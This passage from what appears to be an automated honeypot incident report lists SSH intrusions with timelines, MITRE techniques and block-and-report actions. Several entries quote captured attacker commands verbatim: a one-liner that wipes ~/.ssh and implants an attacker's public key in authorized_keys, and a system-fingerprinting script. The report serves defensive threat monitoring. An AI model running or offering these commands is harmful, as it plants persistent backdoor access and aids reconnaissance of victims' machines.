| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:04:37` | `cowrie.session.connect` |
| `2026-03-11 19:04:37` | `cowrie.client.version` |
| `2026-03-11 19:04:37` | `cowrie.client.kex` |
| `2026-03-11 19:04:38` | `cowrie.login.success` |
| `2026-03-11 19:04:39` | `cowrie.session.params` |
| `2026-03-11 19:04:39` | `cowrie.command.input` |
| `2026-03-11 19:04:39` | `cowrie.command.failed` |
| `2026-03-11 19:04:39` | `cowrie.log.closed` |
| `2026-03-11 19:04:40` | `cowrie.session.params` |
| `2026-03-11 19:04:40` | `cowrie.command.input` |
| `2026-03-11 19:04:40` | `cowrie.session.file_download` |
| `2026-03-11 19:04:40` | `cowrie.log.closed` |
| `2026-03-11 19:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.125.24[.]202` to AbuseIPDB if not already reported
- [ ] Block `179.125.24[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49daf004bbf5

| Field | Detail |
|---|---|
| **Source IP** | `179.125.24[.]202` |
| **First Seen** | 2026-03-11 19:04 |
| **Last Seen** | 2026-03-11 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:04:44` | `cowrie.session.connect` |
| `2026-03-11 19:04:44` | `cowrie.client.version` |
| `2026-03-11 19:04:44` | `cowrie.client.kex` |
| `2026-03-11 19:04:46` | `cowrie.login.success` |
| `2026-03-11 19:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.125.24[.]202` to AbuseIPDB if not already reported
- [ ] Block `179.125.24[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eda0b0616a8

| Field | Detail |
|---|---|
| **Source IP** | `179.125.24[.]202` |
| **First Seen** | 2026-03-11 19:07 |
| **Last Seen** | 2026-03-11 19:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:07:05` | `cowrie.session.connect` |
| `2026-03-11 19:07:05` | `cowrie.client.version` |
| `2026-03-11 19:07:06` | `cowrie.client.kex` |
| `2026-03-11 19:07:07` | `cowrie.login.success` |
| `2026-03-11 19:07:08` | `cowrie.session.params` |
| `2026-03-11 19:07:08` | `cowrie.command.input` |
| `2026-03-11 19:07:08` | `cowrie.command.failed` |
| `2026-03-11 19:07:08` | `cowrie.log.closed` |
| `2026-03-11 19:07:09` | `cowrie.session.params` |
| `2026-03-11 19:07:09` | `cowrie.command.input` |
| `2026-03-11 19:07:09` | `cowrie.session.file_download` |
| `2026-03-11 19:07:09` | `cowrie.log.closed` |
| `2026-03-11 19:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.125.24[.]202` to AbuseIPDB if not already reported
- [ ] Block `179.125.24[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60d6bad3b65b

| Field | Detail |
|---|---|
| **Source IP** | `179.125.24[.]202` |
| **First Seen** | 2026-03-11 19:07 |
| **Last Seen** | 2026-03-11 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:07:13` | `cowrie.session.connect` |
| `2026-03-11 19:07:13` | `cowrie.client.version` |
| `2026-03-11 19:07:13` | `cowrie.client.kex` |
| `2026-03-11 19:07:14` | `cowrie.login.success` |
| `2026-03-11 19:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.125.24[.]202` to AbuseIPDB if not already reported
- [ ] Block `179.125.24[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f39e1487c73

| Field | Detail |
|---|---|
| **Source IP** | `179.125.24[.]202` |
| **First Seen** | 2026-03-11 19:09 |
| **Last Seen** | 2026-03-11 19:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:09:32` | `cowrie.session.connect` |
| `2026-03-11 19:09:32` | `cowrie.client.version` |
| `2026-03-11 19:09:33` | `cowrie.client.kex` |
| `2026-03-11 19:09:34` | `cowrie.login.success` |
| `2026-03-11 19:09:35` | `cowrie.session.params` |
| `2026-03-11 19:09:35` | `cowrie.command.input` |
| `2026-03-11 19:09:35` | `cowrie.command.failed` |
| `2026-03-11 19:09:35` | `cowrie.log.closed` |
| `2026-03-11 19:09:36` | `cowrie.session.params` |
| `2026-03-11 19:09:36` | `cowrie.command.input` |
| `2026-03-11 19:09:36` | `cowrie.session.file_download` |
| `2026-03-11 19:09:36` | `cowrie.log.closed` |
| `2026-03-11 19:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.125.24[.]202` to AbuseIPDB if not already reported
- [ ] Block `179.125.24[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af1c22481d9e

| Field | Detail |
|---|---|
| **Source IP** | `179.125.24[.]202` |
| **First Seen** | 2026-03-11 19:09 |
| **Last Seen** | 2026-03-11 19:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:09:40` | `cowrie.session.connect` |
| `2026-03-11 19:09:40` | `cowrie.client.version` |
| `2026-03-11 19:09:40` | `cowrie.client.kex` |
| `2026-03-11 19:09:41` | `cowrie.login.success` |
| `2026-03-11 19:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.125.24[.]202` to AbuseIPDB if not already reported
- [ ] Block `179.125.24[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52e4455b15dd

| Field | Detail |
|---|---|
| **Source IP** | `179.125.24[.]202` |
| **First Seen** | 2026-03-11 19:11 |
| **Last Seen** | 2026-03-11 19:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:11:54` | `cowrie.session.connect` |
| `2026-03-11 19:11:54` | `cowrie.client.version` |
| `2026-03-11 19:11:54` | `cowrie.client.kex` |
| `2026-03-11 19:11:56` | `cowrie.login.success` |
| `2026-03-11 19:11:56` | `cowrie.session.params` |
| `2026-03-11 19:11:56` | `cowrie.command.input` |
| `2026-03-11 19:11:56` | `cowrie.command.failed` |
| `2026-03-11 19:11:57` | `cowrie.log.closed` |
| `2026-03-11 19:11:57` | `cowrie.session.params` |
| `2026-03-11 19:11:57` | `cowrie.command.input` |
| `2026-03-11 19:11:58` | `cowrie.session.file_download` |
| `2026-03-11 19:11:58` | `cowrie.log.closed` |
| `2026-03-11 19:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.125.24[.]202` to AbuseIPDB if not already reported
- [ ] Block `179.125.24[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13a8983e3cbf

| Field | Detail |
|---|---|
| **Source IP** | `179.125.24[.]202` |
| **First Seen** | 2026-03-11 19:12 |
| **Last Seen** | 2026-03-11 19:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:12:01` | `cowrie.session.connect` |
| `2026-03-11 19:12:01` | `cowrie.client.version` |
| `2026-03-11 19:12:01` | `cowrie.client.kex` |
| `2026-03-11 19:12:03` | `cowrie.login.success` |
| `2026-03-11 19:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.125.24[.]202` to AbuseIPDB if not already reported
- [ ] Block `179.125.24[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d87e89c850b

| Field | Detail |
|---|---|
| **Source IP** | `139.59.189[.]45` |
| **First Seen** | 2026-03-11 19:36 |
| **Last Seen** | 2026-03-11 19:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:36:45` | `cowrie.session.connect` |
| `2026-03-11 19:36:45` | `cowrie.client.version` |
| `2026-03-11 19:36:45` | `cowrie.client.kex` |
| `2026-03-11 19:36:47` | `cowrie.login.success` |
| `2026-03-11 19:36:48` | `cowrie.session.params` |
| `2026-03-11 19:36:48` | `cowrie.command.input` |
| `2026-03-11 19:36:48` | `cowrie.command.input` |
| `2026-03-11 19:36:48` | `cowrie.command.input` |
| `2026-03-11 19:36:48` | `cowrie.command.input` |
| `2026-03-11 19:36:49` | `cowrie.log.closed` |
| `2026-03-11 19:36:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.189[.]45` to AbuseIPDB if not already reported
- [ ] Block `139.59.189[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1f124dccf02

| Field | Detail |
|---|---|
| **Source IP** | `139.59.189[.]45` |
| **First Seen** | 2026-03-11 19:37 |
| **Last Seen** | 2026-03-11 19:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:37:25` | `cowrie.session.connect` |
| `2026-03-11 19:37:25` | `cowrie.client.version` |
| `2026-03-11 19:37:26` | `cowrie.client.kex` |
| `2026-03-11 19:37:27` | `cowrie.login.success` |
| `2026-03-11 19:37:28` | `cowrie.session.params` |
| `2026-03-11 19:37:28` | `cowrie.command.input` |
| `2026-03-11 19:37:28` | `cowrie.command.input` |
| `2026-03-11 19:37:28` | `cowrie.command.input` |
| `2026-03-11 19:37:28` | `cowrie.command.input` |
| `2026-03-11 19:37:28` | `cowrie.log.closed` |
| `2026-03-11 19:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.189[.]45` to AbuseIPDB if not already reported
- [ ] Block `139.59.189[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-467137d97b8d

| Field | Detail |
|---|---|
| **Source IP** | `139.59.189[.]45` |
| **First Seen** | 2026-03-11 19:38 |
| **Last Seen** | 2026-03-11 19:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:38:05` | `cowrie.session.connect` |
| `2026-03-11 19:38:05` | `cowrie.client.version` |
| `2026-03-11 19:38:05` | `cowrie.client.kex` |
| `2026-03-11 19:38:07` | `cowrie.login.success` |
| `2026-03-11 19:38:07` | `cowrie.session.params` |
| `2026-03-11 19:38:07` | `cowrie.command.input` |
| `2026-03-11 19:38:07` | `cowrie.command.input` |
| `2026-03-11 19:38:07` | `cowrie.command.input` |
| `2026-03-11 19:38:07` | `cowrie.command.input` |
| `2026-03-11 19:38:08` | `cowrie.log.closed` |
| `2026-03-11 19:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.189[.]45` to AbuseIPDB if not already reported
- [ ] Block `139.59.189[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18acfa06b1c0

| Field | Detail |
|---|---|
| **Source IP** | `139.59.189[.]45` |
| **First Seen** | 2026-03-11 19:38 |
| **Last Seen** | 2026-03-11 19:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:38:44` | `cowrie.session.connect` |
| `2026-03-11 19:38:45` | `cowrie.client.version` |
| `2026-03-11 19:38:45` | `cowrie.client.kex` |
| `2026-03-11 19:38:46` | `cowrie.login.success` |
| `2026-03-11 19:38:47` | `cowrie.session.params` |
| `2026-03-11 19:38:47` | `cowrie.command.input` |
| `2026-03-11 19:38:47` | `cowrie.command.input` |
| `2026-03-11 19:38:47` | `cowrie.command.input` |
| `2026-03-11 19:38:47` | `cowrie.command.input` |
| `2026-03-11 19:38:47` | `cowrie.log.closed` |
| `2026-03-11 19:38:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.189[.]45` to AbuseIPDB if not already reported
- [ ] Block `139.59.189[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-092a6e92e0f8

| Field | Detail |
|---|---|
| **Source IP** | `139.59.189[.]45` |
| **First Seen** | 2026-03-11 19:39 |
| **Last Seen** | 2026-03-11 19:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:39:24` | `cowrie.session.connect` |
| `2026-03-11 19:39:24` | `cowrie.client.version` |
| `2026-03-11 19:39:24` | `cowrie.client.kex` |
| `2026-03-11 19:39:26` | `cowrie.login.success` |
| `2026-03-11 19:39:27` | `cowrie.session.params` |
| `2026-03-11 19:39:27` | `cowrie.command.input` |
| `2026-03-11 19:39:27` | `cowrie.command.input` |
| `2026-03-11 19:39:27` | `cowrie.command.input` |
| `2026-03-11 19:39:27` | `cowrie.command.input` |
| `2026-03-11 19:39:27` | `cowrie.log.closed` |
| `2026-03-11 19:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.189[.]45` to AbuseIPDB if not already reported
- [ ] Block `139.59.189[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fd3cba79d5e

| Field | Detail |
|---|---|
| **Source IP** | `139.59.189[.]45` |
| **First Seen** | 2026-03-11 19:40 |
| **Last Seen** | 2026-03-11 19:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:40:03` | `cowrie.session.connect` |
| `2026-03-11 19:40:04` | `cowrie.client.version` |
| `2026-03-11 19:40:04` | `cowrie.client.kex` |
| `2026-03-11 19:40:05` | `cowrie.login.success` |
| `2026-03-11 19:40:06` | `cowrie.session.params` |
| `2026-03-11 19:40:06` | `cowrie.command.input` |
| `2026-03-11 19:40:06` | `cowrie.command.input` |
| `2026-03-11 19:40:06` | `cowrie.command.input` |
| `2026-03-11 19:40:06` | `cowrie.command.input` |
| `2026-03-11 19:40:06` | `cowrie.log.closed` |
| `2026-03-11 19:40:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.189[.]45` to AbuseIPDB if not already reported
- [ ] Block `139.59.189[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59ad79b325ef

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-03-11 19:41 |
| **Last Seen** | 2026-03-11 19:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:41:46` | `cowrie.session.connect` |
| `2026-03-11 19:41:46` | `cowrie.client.version` |
| `2026-03-11 19:41:46` | `cowrie.client.kex` |
| `2026-03-11 19:41:48` | `cowrie.login.success` |
| `2026-03-11 19:41:48` | `cowrie.session.params` |
| `2026-03-11 19:41:48` | `cowrie.command.input` |
| `2026-03-11 19:41:48` | `cowrie.command.failed` |
| `2026-03-11 19:41:49` | `cowrie.log.closed` |
| `2026-03-11 19:41:49` | `cowrie.session.params` |
| `2026-03-11 19:41:49` | `cowrie.command.input` |
| `2026-03-11 19:41:49` | `cowrie.session.file_download` |
| `2026-03-11 19:41:49` | `cowrie.log.closed` |
| `2026-03-11 19:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-824aa4327396

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-03-11 19:41 |
| **Last Seen** | 2026-03-11 19:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 19:41:53` | `cowrie.session.connect` |
| `2026-03-11 19:41:53` | `cowrie.client.version` |
| `2026-03-11 19:41:53` | `cowrie.client.kex` |
| `2026-03-11 19:41:55` | `cowrie.login.success` |
| `2026-03-11 19:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

